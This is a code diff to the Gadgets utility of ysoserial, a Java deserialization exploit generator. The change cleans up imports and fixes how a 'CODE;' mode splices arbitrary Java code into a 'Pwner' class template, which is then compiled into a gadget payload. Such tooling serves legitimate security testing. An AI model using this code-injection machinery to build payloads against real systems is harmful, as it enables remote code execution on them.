@@ -3,7 +3,6 @@ package ysoserial.payloads.util;
 
 import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
 
-import java.io.ByteArrayInputStream;
 import java.io.InputStream;
 import java.io.Serializable;
 import java.lang.reflect.Array;
@@ -11,15 +10,11 @@ import java.lang.reflect.Constructor;
 import java.lang.reflect.InvocationHandler;
 import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Proxy;
-import java.net.URL;
-import java.nio.file.Files;
-import java.nio.file.Paths;
 import java.security.*;
 import java.util.Base64;
 import java.util.HashMap;
 import java.util.Map;
 
-import com.nqzero.permit.Permit;
 import javassist.ClassClassPath;
 import javassist.ClassPool;
 import javassist.CtClass;
@@ -32,7 +27,6 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
 import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
 import org.apache.commons.io.IOUtils;
-import top.inhann.Test;
 
 
 /*
@@ -130,10 +124,10 @@ public class Gadgets {
 
         if(command.startsWith("CODE;")){
             String code = command.substring(5);
-            InputStream inputStream = Test.class.getClassLoader().getResourceAsStream("Pwner.java");
+            InputStream inputStream = Gadgets.class.getClassLoader().getResourceAsStream("Pwner.java");
             byte[] java = IOUtils.toByteArray(inputStream);
             String javacode = new String(java);
-            javacode = javacode.replace("System.out.println(9999);",command.substring(5));
+            javacode = javacode.replace("System.out.println(9999);",code);
             classBytes = JavaCompiler.compile("Pwner",javacode);
         }else if(command.startsWith("CLASS;")){
             String javacode = command.substring(6);
